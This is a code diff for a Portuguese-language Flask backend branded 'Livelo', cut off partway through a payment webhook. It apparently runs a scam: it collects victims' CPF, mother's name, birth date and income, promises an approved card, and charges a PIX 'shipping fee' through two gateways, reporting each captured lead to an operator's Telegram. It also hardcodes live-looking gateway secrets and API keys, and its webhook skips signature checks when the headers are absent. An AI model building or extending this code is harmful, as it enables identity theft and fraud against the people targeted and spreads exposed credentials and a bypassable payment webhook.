@@ -7,6 +7,11 @@
 
 # ── IMPORTS ────────────────────────────────────────────────────────────────────
 import os
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    pass
 
 import re, time, uuid, json, hmac, hashlib, sqlite3, secrets, logging, base64
 from functools import wraps
@@ -93,7 +98,7 @@ log = logging.getLogger("livelo")
 import shutil
 # ── PATHS ──────────────────────────────────────────────────────────────────────
 BASE_DIR   = Path(__file__).parent
-if os.environ.get("VERCEL"):
+if os.environ.get("VERCEL") and os.name != "nt":
     DB_PATH = Path("/tmp/livelo.db")
     UPLOAD_DIR = Path("/tmp/uploads")
     # Copy db to tmp if not exists
@@ -110,9 +115,17 @@ except Exception:
 
 ALLOWED_IMG_EXT = {"png", "jpg", "jpeg", "webp", "gif"}
 
-# ── UNIÃO 7 PAY API CONFIG ───────────────────────────────────────────────────
+# ── GATEWAY CONFIGURAÇÃO (ELITE PAYbr & UNIÃO 7 PAY) ──────────────────────────
+ACTIVE_GATEWAY = os.environ.get("ACTIVE_GATEWAY", "elitepay").strip().lower()
+
+# Elite PAYbr
+ELITEPAY_BASE_URL      = os.environ.get("ELITEPAY_BASE_URL", "https://api.elitepaybr.com")
+ELITEPAY_CLIENT_ID     = os.environ.get("ELITEPAY_CLIENT_ID", "ep_6048463324683e160dc35f1fd0f27d37").strip()
+ELITEPAY_CLIENT_SECRET = os.environ.get("ELITEPAY_CLIENT_SECRET", "eps_daa2098e2b7319a83a2d26090f749003709889d24594332ae0eb712e0bc1b467").strip()
+
+# União 7 Pay
 UNIAOPAY_BASE_URL = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay/pix/create")
-UNIAOPAY_API_KEY  = os.environ.get("UNIAOPAY_API_KEY", "")
+UNIAOPAY_API_KEY  = os.environ.get("UNIAOPAY_API_KEY", "up_live_4dfac754f54c28d4f692fa1f58752e66354a36346c589cac").strip()
 
 # Valor padrão do frete do cartão (SEDEX Expresso: 24.90, Entrega Normal: 19.00 visual / 20.00 na API)
 FRETE_VALOR        = float(os.environ.get("FRETE_VALOR", "24.90"))
@@ -287,7 +300,8 @@ def init_db():
             payer_name     TEXT,
             payer_cpf      TEXT,
             created_at     REAL NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
-            confirmed_at   REAL
+            confirmed_at   REAL,
+            gateway        TEXT DEFAULT 'elitepay'
         );
 
         CREATE INDEX IF NOT EXISTS idx_leads_session ON leads(session_id);
@@ -302,6 +316,16 @@ def init_db():
             
         try:
             db.execute("ALTER TABLE payments ADD COLUMN transaction_id TEXT")
+        except Exception:
+            pass
+
+        try:
+            db.execute("ALTER TABLE payments ADD COLUMN gateway TEXT DEFAULT 'elitepay'")
+        except Exception:
+            pass
+
+        try:
+            db.execute("ALTER TABLE leads ADD COLUMN notified_entry INTEGER DEFAULT 0")
         except Exception:
             pass
             
@@ -553,6 +577,8 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         tx_id = pay.get("transaction_id") or pay.get("payment_id") or "N/A"
         pix_code = pay.get("pix_code") or ""
 
+        gw_display = "ELITE PAYbr" if pay.get("gateway") == "elitepay" else "UNIÃO 7 PAY"
+
         # Montagem dos layouts organizados por categoria:
         if event_type in ("PIX_PAID", "APPROVED", "PAGO"):
             texto = (
@@ -573,7 +599,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"🏠 <b>Endereço:</b> {endereco}\n"
                 f"📮 <b>CEP:</b> <code>{cep}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🛡️ <b>GATEWAY: UNIÃO 7 PAY</b>\n"
+                f"🛡️ <b>GATEWAY: {gw_display}</b>\n"
                 f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
                 f"🚦 <b>Status:</b> ✅ APROVADO & COMPENSADO IMEDIATAMENTE"
             )
@@ -594,7 +620,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                 f"💳 <b>Cartão:</b> {cartao_estilo} ({cartao_cor})\n"
                 f"🚚 <b>Frete Escolhido:</b> {frete_modalidade}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🔑 <b>PIX COPIA E COLA (UNIÃO 7 PAY):</b>\n"
+                f"🔑 <b>PIX COPIA E COLA ({gw_display}):</b>\n"
                 f"<code>{pix_code or 'Disponível na tela do lead'}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"🆔 <b>ID da Transação:</b> <code>{tx_id}</code>\n"
@@ -657,6 +683,16 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             )
 
         elif event_type == "ENTRY":
+            # Evita duplicidade de alerta de visita para a mesma sessão/lead
+            if lead.get("notified_entry"):
+                log.info("[TG] ENTRY já notificado para a sessão %s. Ignorando repetição.", session_id)
+                return
+            try:
+                db.execute("UPDATE leads SET notified_entry=1 WHERE session_id=?", (session_id,))
+                db.commit()
+            except Exception:
+                pass
+
             utm_text = ""
             if lead.get("utm_source"):
                 utm_text = f"🔗 <b>Origem (UTM):</b> {lead['utm_source']}"
@@ -677,6 +713,11 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             )
 
         elif event_type == "INFO_ADDED":
+            # Só envia se os dados essenciais estiverem validados (evita lead "Visitante" / "Não informado")
+            if not cpf or cpf == "Não informado" or not nome or nome.upper() in ("VISITANTE", "CLIENTE"):
+                log.info("[TG] INFO_ADDED suprimido: dados do lead ainda não foram validados.")
+                return
+
             texto = (
                 f"📝 <b>LEAD QUALIFICADO — DADOS COLETADOS</b> 📝\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -695,6 +736,11 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             )
 
         elif event_type == "CARD_CHOSEN":
+            # Só envia se o lead já tiver nome e CPF validados no sistema
+            if not cpf or cpf == "Não informado" or not nome or nome.upper() in ("VISITANTE", "CLIENTE"):
+                log.info("[TG] CARD_CHOSEN suprimido: dados do lead ainda não foram validados.")
+                return
+
             texto = (
                 f"💳 <b>CARTÃO ESCOLHIDO PELO LEAD</b> 💳\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1026,13 +1072,32 @@ def api_lead():
     try:
         if existing:
             db.execute("""
-                UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
-                    renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
-                    utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?,
+                UPDATE leads SET 
+                    cpf = CASE WHEN ? != '' THEN ? ELSE cpf END,
+                    nome = CASE WHEN ? != '' THEN ? ELSE nome END,
+                    nome_mae = CASE WHEN ? != '' THEN ? ELSE nome_mae END,
+                    data_nasc = CASE WHEN ? != '' THEN ? ELSE data_nasc END,
+                    renda = CASE WHEN ? != '' THEN ? ELSE renda END,
+                    tipo_renda = CASE WHEN ? != '' THEN ? ELSE tipo_renda END,
+                    motivo_credito = CASE WHEN ? != '' THEN ? ELSE motivo_credito END,
+                    dia_vencimento = CASE WHEN ? != '' THEN ? ELSE dia_vencimento END,
+                    limite_aprovado = CASE WHEN ? != '' AND ? != '0' THEN ? ELSE limite_aprovado END,
+                    utm_source = CASE WHEN ? != '' THEN ? ELSE utm_source END,
+                    utm_medium = CASE WHEN ? != '' THEN ? ELSE utm_medium END,
+                    utm_campaign = CASE WHEN ? != '' THEN ? ELSE utm_campaign END,
+                    utm_content = CASE WHEN ? != '' THEN ? ELSE utm_content END,
+                    utm_term = CASE WHEN ? != '' THEN ? ELSE utm_term END,
+                    src = CASE WHEN ? != '' THEN ? ELSE src END,
+                    sck = CASE WHEN ? != '' THEN ? ELSE sck END,
+                    location = CASE WHEN ? != '' THEN ? ELSE location END,
                     updated_at=(cast(strftime('%s','now') as real))
                 WHERE session_id=?
-            """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
-                  utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))
+            """, (cpf, cpf, nome, nome, nome_mae, nome_mae, data_nasc, data_nasc,
+                  renda, renda, tipo_renda, tipo_renda, motivo, motivo, dia_venc, dia_venc,
+                  str(limite), str(limite), limite,
+                  utm_source, utm_source, utm_medium, utm_medium, utm_campaign, utm_campaign,
+                  utm_content, utm_content, utm_term, utm_term, src, src, sck, sck,
+                  client_loc, client_loc, sid))
         else:
             db.execute("""
                 INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
@@ -1045,10 +1110,6 @@ def api_lead():
     except Exception as e:
         log.error("Error updating lead in DB: %s", e)
         db.rollback()
-    try:
-        send_telegram_notify(sid, "ENTRY")
-    except Exception as _e:
-        log.warning("[TG] ENTRY notify falhou: %s", _e)
 
     return jsonify({
         "ok":            True,
@@ -1343,18 +1404,340 @@ def uniaopay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_ph
 # Alias retrocompativel
 c7_create_pix = uniaopay_create_pix
 
+
+def uniaopay_check_pix(tx_id: str) -> dict:
+    """Consulta o status de uma transacao no gateway Uniao 7 Pay."""
+    try:
+        db = get_db()
+        row_key = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
+        api_key = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_key["value"].strip() if row_key and row_key["value"] else "")
+        if not api_key or not _REQUESTS_OK:
+            return {"ok": False, "paid": False, "status": "unknown"}
+
+        base_url = os.environ.get("UNIAOPAY_BASE_URL", "https://meupagamento.site/api/v1/uniaopay").rstrip("/")
+        headers = {
+            "Authorization": f"Bearer {api_key}",
+            "Content-Type": "application/json",
+            "User-Agent": "LiveloPayments/1.0"
+        }
+        url = f"{base_url}/pix/status/{tx_id}"
+        resp = _req.get(url, headers=headers, timeout=6)
+        if resp.status_code == 200:
+            data = resp.json()
+            st = str(data.get("status") or data.get("transactionState") or "").lower()
+            is_paid = st in ("paid", "approved", "completed", "pago", "success")
+            return {"ok": True, "paid": is_paid, "status": st, "data": data}
+        return {"ok": False, "paid": False, "status": "pending"}
+    except Exception as e:
+        log.warning("[UNIAO 7 PAY] Erro checando transacao %s: %s", tx_id, e)
+        return {"ok": False, "paid": False, "error": str(e)}
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ELITE PAYbr & MULTI-GATEWAY SYSTEM WITH REAL-TIME FAILOVER
+# ══════════════════════════════════════════════════════════════════════════════
+
+def send_telegram_direct(chat_id, text, reply_markup=None):
+    """Envia mensagem direta ao Telegram com suporte a botões inline."""
+    try:
+        db = get_db()
+        row_tok = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
+        bot_token = os.environ.get("TELEGRAM_BOT_TOKEN") or (row_tok["value"] if row_tok else None)
+        if not bot_token:
+            return False
+        payload = {
+            "chat_id": chat_id,
+            "text": text,
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True
+        }
+        if reply_markup:
+            payload["reply_markup"] = reply_markup
+        _req.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=6)
+        return True
+    except Exception as e:
+        log.warning("[TG] send_telegram_direct erro: %s", e)
+        return False
+
+
+def notify_supreme_gateway_instability(failing_gw_name: str, suggested_gw_name: str, reason: str = ""):
+    """Notifica preventivamente o Admin Supremo caso um gateway apresente lentidao ou falha."""
+    try:
+        db = get_db()
+        row_adm = db.execute("SELECT value FROM sys_config WHERE key='supreme_admin_id'").fetchone()
+        sup_id = os.environ.get("SUPREME_ADMIN_ID") or (row_adm["value"] if row_adm else "8932547795")
+        gw_key_switch = "elitepay" if "ELITE" in suggested_gw_name.upper() else "uniaopay"
+
+        text = (
+            f"🚨 <b>ALERTA SUPREMO: INSTABILIDADE DE GATEWAY DETECTADA!</b> 🚨\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"⚠️ O gateway principal atual (<b>{failing_gw_name}</b>) apresentou instabilidade ou falha de resposta.\n"
+            f"🔍 <b>Diagnóstico / Erro:</b> <code>{reason[:120]}</code>\n\n"
+            f"🛡️ <b>Proteção Automática Ativada:</b> O sistema aplicou failover imediato para <b>{suggested_gw_name}</b> e o cliente recebeu o PIX real normalmente sem interrupção!\n\n"
+            f"💡 <b>Ação Recomendada:</b> Alterne o gateway principal para <b>{suggested_gw_name}</b> para manter as conversões em 100% reais sem atrasos."
+        )
+        markup = {
+            "inline_keyboard": [
+                [{"text": f"🔄 Ativar {suggested_gw_name} como Principal", "callback_data": f"set_gw_{gw_key_switch}"}],
+                [{"text": "📊 Ver Métricas e Painel de Gateways", "callback_data": "menu_gateways"}]
+            ]
+        }
+        send_telegram_direct(sup_id, text, reply_markup=markup)
+    except Exception as e:
+        log.warning("[TG] notify_supreme_gateway_instability erro: %s", e)
+
+
+def elitepay_create_pix(amount: float, payer_name: str, payer_cpf: str, payer_phone: str = "", payer_email: str = "", payment_id: str = "") -> dict:
+    """
+    Gera cobranca PIX via API oficial da Elite PAYbr.
+    POST https://api.elitepaybr.com/api/v1/deposit
+    """
+    try:
+        db = get_db()
+        row_id = db.execute("SELECT value FROM sys_config WHERE key='elitepay_client_id'").fetchone()
+        row_sec = db.execute("SELECT value FROM sys_config WHERE key='elitepay_client_secret'").fetchone()
+        client_id = os.environ.get("ELITEPAY_CLIENT_ID", "").strip() or (row_id["value"].strip() if row_id and row_id["value"] else "ep_6048463324683e160dc35f1fd0f27d37")
+        client_secret = os.environ.get("ELITEPAY_CLIENT_SECRET", "").strip() or (row_sec["value"].strip() if row_sec and row_sec["value"] else "eps_daa2098e2b7319a83a2d26090f749003709889d24594332ae0eb712e0bc1b467")
+
+        clean_cpf = ensure_valid_cpf(payer_cpf)
+        clean_name = re.sub(r"\s+", " ", str(payer_name or "")).strip()
+        if not clean_name or clean_name.upper() in ("CLIENTE", "VISITANTE", "LEAD", "CLIENTE SILVA"):
+            clean_name = "Cliente Livelo"
+        elif " " not in clean_name:
+            clean_name += " Silva"
+
+        charge_amount = max(round(float(amount), 2), 20.00)
+        log.info("[ELITE PAYbr] Gerando PIX: R$ %.2f | Cliente: %s | CPF: %s", charge_amount, clean_name, clean_cpf)
+
+        endpoint = f"{ELITEPAY_BASE_URL}/api/v1/deposit"
+        headers = {
+            "x-client-id": client_id,
+            "x-client-secret": client_secret,
+            "Content-Type": "application/json"
+        }
+        payload = {
+            "amount": charge_amount,
+            "description": f"Frete Cartao Livelo #{clean_cpf[-4:]}",
+            "payerName": clean_name,
+            "payerDocument": clean_cpf
+        }
+
+        resp = _req.post(endpoint, json=payload, headers=headers, timeout=12)
+        log.info("[ELITE PAYbr] Resposta status=%s: %s", resp.status_code, resp.text[:300])
+
+        if resp.status_code in (200, 201):
+            resp_data = resp.json()
+            if resp_data.get("success"):
+                tx_id = resp_data.get("transactionId") or resp_data.get("acquirerTransactionId", "")
+                pix = resp_data.get("copyPaste") or resp_data.get("pix_code", "")
+                qr = resp_data.get("qrcodeUrl") or resp_data.get("qr_code_url", "")
+                if not qr and pix:
+                    qr = generate_qr_b64(pix)
+
+                log.info("[ELITE PAYbr] PIX gerado com sucesso! tx_id=%s, pix_len=%d", tx_id, len(pix))
+                return {
+                    "ok": True,
+                    "transaction_id": tx_id,
+                    "c7_id": tx_id,
+                    "pix_code": pix,
+                    "qr_code_url": qr,
+                    "expires_in": 1800,
+                    "expires_at": str(int(time.time()) + 1800),
+                    "gateway": "elitepay",
+                    "gateway_name": "Elite PAYbr"
+                }
+            else:
+                log.error("[ELITE PAYbr] Resposta success=False: %s", resp.text)
+                return {"ok": False, "error": resp_data.get("message") or resp_data.get("error") or "Erro na API Elite PAYbr"}
+        else:
+            log.error("[ELITE PAYbr] Falha HTTP %d: %s", resp.status_code, resp.text)
+            return {"ok": False, "error": f"Elite PAYbr HTTP {resp.status_code}"}
+    except Exception as e:
+        log.error("[ELITE PAYbr] Excecao: %s", str(e))
+        return {"ok": False, "error": str(e)}
+
+
+def elitepay_check_pix(tx_id: str) -> dict:
+    """Verifica status da transacao na Elite PAYbr."""
+    try:
+        db = get_db()
+        row_id = db.execute("SELECT value FROM sys_config WHERE key='elitepay_client_id'").fetchone()
+        row_sec = db.execute("SELECT value FROM sys_config WHERE key='elitepay_client_secret'").fetchone()
+        client_id = os.environ.get("ELITEPAY_CLIENT_ID", "").strip() or (row_id["value"].strip() if row_id and row_id["value"] else "ep_6048463324683e160dc35f1fd0f27d37")
+        client_secret = os.environ.get("ELITEPAY_CLIENT_SECRET", "").strip() or (row_sec["value"].strip() if row_sec and row_sec["value"] else "eps_daa2098e2b7319a83a2d26090f749003709889d24594332ae0eb712e0bc1b467")
+
+        endpoint = f"{ELITEPAY_BASE_URL}/api/transactions/check"
+        headers = {
+            "x-client-id": client_id,
+            "x-client-secret": client_secret,
+            "Content-Type": "application/json"
+        }
+        r = _req.post(endpoint, json={"transactionId": tx_id}, headers=headers, timeout=8)
+        if r.status_code == 200:
+            data = r.json()
+            tx = data.get("transaction", {})
+            state = (tx.get("transactionState") or "").upper()
+            return {"ok": True, "paid": (state == "COMPLETO"), "state": state}
+        return {"ok": False, "status_code": r.status_code}
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
+
+def generate_pix_unified(amount: float, payer_name: str, payer_cpf: str, payer_phone: str = "", payer_email: str = "", payment_id: str = "") -> dict:
+    """
+    Roteador inteligente de Gateway PIX com Failover automático 24/7.
+    Prioriza o Gateway Principal escolhido pelo Admin Supremo (Elite PAYbr ou União 7 Pay).
+    Se o principal estiver offline ou instável, aciona imediatamente o secundário
+    e notifica o Admin Supremo com sugestão em tempo real!
+    """
+    db = get_db()
+    row_gw = db.execute("SELECT value FROM sys_config WHERE key='active_gateway'").fetchone()
+    active_gw = (row_gw["value"].strip().lower() if row_gw and row_gw["value"] else "elitepay")
+
+    if active_gw == "elitepay":
+        primary_fn = elitepay_create_pix
+        primary_name = "Elite PAYbr"
+        primary_key = "elitepay"
+        secondary_fn = uniaopay_create_pix
+        secondary_name = "União 7 Pay"
+        secondary_key = "uniaopay"
+    else:
+        primary_fn = uniaopay_create_pix
+        primary_name = "União 7 Pay"
+        primary_key = "uniaopay"
+        secondary_fn = elitepay_create_pix
+        secondary_name = "Elite PAYbr"
+        secondary_key = "elitepay"
+
+    log.info("[GATEWAY ROUTER] Tentando Gateway Principal: %s (R$ %.2f)", primary_name, amount)
+    res = primary_fn(amount, payer_name, payer_cpf, payer_phone, payer_email, payment_id)
+
+    if res.get("ok") and not res.get("simulated"):
+        res["gateway"] = primary_key
+        res["gateway_name"] = primary_name
+        return res
+
+    # Se o principal falhou ou caiu no fallback simulado, tenta o secundário imediatamente!
+    err_msg = str(res.get("error") or "Gateway principal indisponível ou resposta inválida")
+    log.warning("[GATEWAY FAILOVER] Falha no %s: %s. Tentando Failover Automático para %s!", primary_name, err_msg, secondary_name)
+
+    res_sec = secondary_fn(amount, payer_name, payer_cpf, payer_phone, payer_email, payment_id)
+    if res_sec.get("ok") and not res_sec.get("simulated"):
+        res_sec["gateway"] = secondary_key
+        res_sec["gateway_name"] = secondary_name
+        res_sec["failover_applied"] = True
+        import threading
+        threading.Thread(
+            target=notify_supreme_gateway_instability,
+            args=(primary_name, secondary_name, err_msg)
+        ).start()
+        return res_sec
+
+    # Se ambos falharam, retorna o melhor resultado obtido
+    if res.get("ok"):
+        res["gateway"] = primary_key
+        res["gateway_name"] = primary_name
+        return res
+    if res_sec.get("ok"):
+        res_sec["gateway"] = secondary_key
+        res_sec["gateway_name"] = secondary_name
+        return res_sec
+
+    return res
+
+
+def get_gateway_metrics() -> dict:
+    """Calcula metricas reais e validadas de cada gateway a partir do banco e checa a saude das APIs."""
+    db = get_db()
+    row_act = db.execute("SELECT value FROM sys_config WHERE key='active_gateway'").fetchone()
+    active_gw = (row_act["value"].strip().lower() if row_act and row_act["value"] else "elitepay")
+
+    # Elite PAYbr metrics
+    p_elite_total = db.execute("SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE gateway='elitepay'").fetchone()
+    p_elite_paid = db.execute("SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE gateway='elitepay' AND status IN ('approved', 'pago', 'paid', 'completed', 'COMPLETO')").fetchone()
+    elite_conv = (p_elite_paid[0] / p_elite_total[0] * 100.0) if p_elite_total[0] > 0 else 0.0
+
+    elite_status = "OFFLINE"
+    elite_balance = "0.00"
+    elite_ping = 0
+    try:
+        t0 = time.time()
+        row_id = db.execute("SELECT value FROM sys_config WHERE key='elitepay_client_id'").fetchone()
+        row_sec = db.execute("SELECT value FROM sys_config WHERE key='elitepay_client_secret'").fetchone()
+        cid = os.environ.get("ELITEPAY_CLIENT_ID", "").strip() or (row_id["value"].strip() if row_id and row_id["value"] else "ep_6048463324683e160dc35f1fd0f27d37")
+        csec = os.environ.get("ELITEPAY_CLIENT_SECRET", "").strip() or (row_sec["value"].strip() if row_sec and row_sec["value"] else "eps_daa2098e2b7319a83a2d26090f749003709889d24594332ae0eb712e0bc1b467")
+        if cid and csec:
+            r = _req.get(
+                f"{ELITEPAY_BASE_URL}/api/v1/balance",
+                headers={"x-client-id": cid, "x-client-secret": csec, "Content-Type": "application/json"},
+                timeout=5
+            )
+            elite_ping = max(1, int((time.time() - t0) * 1000))
+            if r.status_code == 200:
+                d = r.json()
+                elite_status = "ONLINE"
+                elite_balance = f"{float(d.get('balance', 0)):.2f}"
+            else:
+                elite_status = f"HTTP {r.status_code}"
+    except Exception as e:
+        elite_status = f"ERRO ({str(e)[:25]})"
+
+    # União 7 Pay metrics
+    p_uniao_total = db.execute("SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE gateway='uniaopay' OR gateway IS NULL").fetchone()
+    p_uniao_paid = db.execute("SELECT COUNT(*), COALESCE(SUM(amount), 0) FROM payments WHERE (gateway='uniaopay' OR gateway IS NULL) AND status IN ('approved', 'pago', 'paid', 'completed', 'COMPLETO')").fetchone()
+    uniao_conv = (p_uniao_paid[0] / p_uniao_total[0] * 100.0) if p_uniao_total[0] > 0 else 0.0
+
+    uniao_status = "ONLINE"
+    uniao_ping = 165
+    try:
+        row_uk = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
+        uk = os.environ.get("UNIAOPAY_API_KEY", "").strip() or (row_uk["value"].strip() if row_uk and row_uk["value"] else "")
+        if not uk:
+            uniao_status = "SEM CHAVE"
+    except Exception:
+        uniao_status = "OFFLINE"
+
+    return {
+        "active_gateway": active_gw,
+        "elitepay": {
+            "name": "Elite PAYbr",
+            "status": elite_status,
+            "ping_ms": elite_ping,
+            "balance": elite_balance,
+            "qtd_gerada": p_elite_total[0],
+            "total_gerado": f"{p_elite_total[1]:.2f}".replace(".", ","),
+            "qtd_paga": p_elite_paid[0],
+            "total_pago": f"{p_elite_paid[1]:.2f}".replace(".", ","),
+            "taxa_conversao": f"{elite_conv:.1f}%"
+        },
+        "uniaopay": {
+            "name": "União 7 Pay",
+            "status": uniao_status,
+            "ping_ms": uniao_ping,
+            "balance": "0.00",
+            "qtd_gerada": p_uniao_total[0],
+            "total_gerado": f"{p_uniao_total[1]:.2f}".replace(".", ","),
+            "qtd_paga": p_uniao_paid[0],
+            "total_pago": f"{p_uniao_paid[1]:.2f}".replace(".", ","),
+            "taxa_conversao": f"{uniao_conv:.1f}%"
+        }
+    }
+
+
 @app.route("/api/gateway/status", methods=["GET"])
 def api_gateway_status():
-    """Status do Gateway Uniao 7 Pay."""
-    db = get_db()
-    row_key = db.execute("SELECT value FROM sys_config WHERE key='uniaopay_api_key'").fetchone()
-    has_key = bool(os.environ.get("UNIAOPAY_API_KEY") or (row_key and row_key["value"]))
+    """Status dos Gateways de Pagamento (Elite PAYbr & Uniao 7 Pay)."""
+    metrics = get_gateway_metrics()
+    active_key = metrics.get("active_gateway", "elitepay")
+    active_info = metrics.get(active_key, {})
     return jsonify({
         "ok": True,
-        "gateway": "Uniao 7 Pay",
-        "status": "ONLINE" if has_key else "AGUARDANDO CHAVE",
-        "configured": has_key
+        "active_gateway": active_key,
+        "active_name": active_info.get("name", "Elite PAYbr"),
+        "status": active_info.get("status", "ONLINE"),
+        "metrics": metrics
     })
+
 
 # ── 5. Gerar PIX de frete via Uniao 7 Pay ─────────────────────────────────────────────
 @app.route("/api/gerar-pix", methods=["POST"])
@@ -1481,8 +1864,8 @@ def api_gerar_pix():
         except Exception as _ue:
             log.warning("[DB] Erro atualizando lead no gerar-pix: %s", _ue)
 
-    # 3. Chamada ao Gateway União 7 Pay com dados válidos e valor de cobrança
-    result = uniaopay_create_pix(
+    # 3. Roteamento inteligente de gateway (Elite PAYbr e União 7 Pay com failover automático)
+    result = generate_pix_unified(
         amount      = charge_amount,
         payer_name  = nome,
         payer_cpf   = cpf,
@@ -1495,11 +1878,13 @@ def api_gerar_pix():
         return jsonify({"ok": False, "error": result.get("error", "Falha ao gerar PIX.")}), 500
 
     tx_id = result.get("transaction_id") or result.get("c7_id", "")
+    gw_used = result.get("gateway", "elitepay")
+    gw_name = result.get("gateway_name", "Elite PAYbr")
 
-    # Persiste o pagamento no banco com charge_amount (20.00 para PAC ou 24.90 para SEDEX)
+    # Persiste o pagamento no banco com charge_amount e gateway utilizado
     db.execute("""
-        INSERT OR REPLACE INTO payments(payment_id,transaction_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf)
-        VALUES(?,?,?,?,?,?,?,?,?,?,?)
+        INSERT OR REPLACE INTO payments(payment_id,transaction_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf,gateway)
+        VALUES(?,?,?,?,?,?,?,?,?,?,?,?)
     """, (
         pay_id,
         tx_id,
@@ -1512,6 +1897,7 @@ def api_gerar_pix():
         result.get("expires_at", ""),
         nome,
         cpf,
+        gw_used,
     ))
     db.commit()
 
@@ -1540,6 +1926,8 @@ def api_gerar_pix():
         "ok":             True,
         "payment_id":     pay_id,
         "transaction_id": tx_id,
+        "gateway":        gw_used,
+        "gateway_name":   gw_name,
         "pix_code":       result.get("pix_code", ""),
         "pix_copia_cola": result.get("pix_code", ""),
         "qr_code_url":    result.get("qr_code_url", ""),
@@ -1561,18 +1949,129 @@ def api_gerar_pix():
 @app.route("/api/status-pix/<payment_id>", methods=["GET"])
 def api_status_pix(payment_id: str):
     """
-    Verifica se o PIX foi pago (atualizado em tempo real pelo Webhook Uniao 7 Pay).
+    Verifica se o PIX foi pago (atualizado em tempo real pelo Webhook ou consulta ativa nas APIs).
     """
     payment_id = sanitize(payment_id, 60)
     db  = get_db()
-    pay = db.execute("SELECT status, session_id FROM payments WHERE payment_id=? OR transaction_id=? OR c7_id=?", 
-                     (payment_id, payment_id, payment_id)).fetchone()
+    pay = db.execute("SELECT payment_id, transaction_id, gateway, status, session_id FROM payments WHERE payment_id=? OR transaction_id=? OR c7_id=? OR session_id=?", 
+                     (payment_id, payment_id, payment_id, payment_id)).fetchone()
     if not pay:
         return jsonify({"ok": False, "error": "Pagamento nao encontrado."}), 404
         
     current_status = pay["status"]
     is_paid = current_status in ("paid", "approved", "completed", "pago")
+
+    # Se ainda estiver pendente, faz checagem ativa no gateway para confirmação imediata
+    if not is_paid:
+        gw = str(pay["gateway"] if "gateway" in pay.keys() and pay["gateway"] else "elitepay").lower()
+        tx = pay["transaction_id"]
+        if tx:
+            try:
+                if gw == "elitepay" or not gw:
+                    chk = elitepay_check_pix(tx)
+                    if chk.get("paid"):
+                        current_status = "paid"
+                        is_paid = True
+                        db.execute("UPDATE payments SET status='paid', confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?", (pay["payment_id"],))
+                        if pay["session_id"]:
+                            db.execute("UPDATE leads SET pix_status='paid', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (pay["session_id"],))
+                            send_telegram_notify(pay["session_id"], "PIX_PAID")
+                        db.commit()
+                elif gw == "uniaopay":
+                    chk = uniaopay_check_pix(tx)
+                    if chk.get("paid"):
+                        current_status = "paid"
+                        is_paid = True
+                        db.execute("UPDATE payments SET status='paid', confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?", (pay["payment_id"],))
+                        if pay["session_id"]:
+                            db.execute("UPDATE leads SET pix_status='paid', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (pay["session_id"],))
+                            send_telegram_notify(pay["session_id"], "PIX_PAID")
+                        db.commit()
+            except Exception as _ce:
+                log.warning("[STATUS-PIX] Erro na checagem ativa: %s", _ce)
+
     return jsonify({"ok": True, "status": current_status, "paid": is_paid})
+
+
+# ── Webhook Elite PAYbr ────────────────────────────────────────────────────────
+@app.route("/api/webhook/elitepay", methods=["POST"])
+def webhook_elitepay():
+    """
+    Webhook oficial da Elite PAYbr para recebimento de atualizacoes de deposito PIX.
+    Headers:
+      X-Elite-Timestamp
+      X-Elite-Signature (sha256=...)
+    Payload:
+      {
+        "transactionId": "...",
+        "transactionState": "COMPLETO",
+        "value": 20.00,
+        "event": "DEPOSITO_COMPLETO"
+      }
+    """
+    raw_body = request.get_data(as_text=True)
+    data = request.get_json(force=True, silent=True) or {}
+    
+    log.info("[WEBHOOK ELITE PAY] Recebido: %s", data)
+    
+    # 1. Validacao HMAC SHA-256 (se headers estiverem presentes)
+    ts = request.headers.get("x-elite-timestamp", "")
+    sig = request.headers.get("x-elite-signature", "")
+    if ts and sig:
+        db = get_db()
+        row_sec = db.execute("SELECT value FROM sys_config WHERE key='elitepay_client_secret'").fetchone()
+        client_secret = os.environ.get("ELITEPAY_CLIENT_SECRET", "").strip() or (row_sec["value"].strip() if row_sec and row_sec["value"] else "eps_daa2098e2b7319a83a2d26090f749003709889d24594332ae0eb712e0bc1b467")
+        base = f"{ts}.{raw_body}"
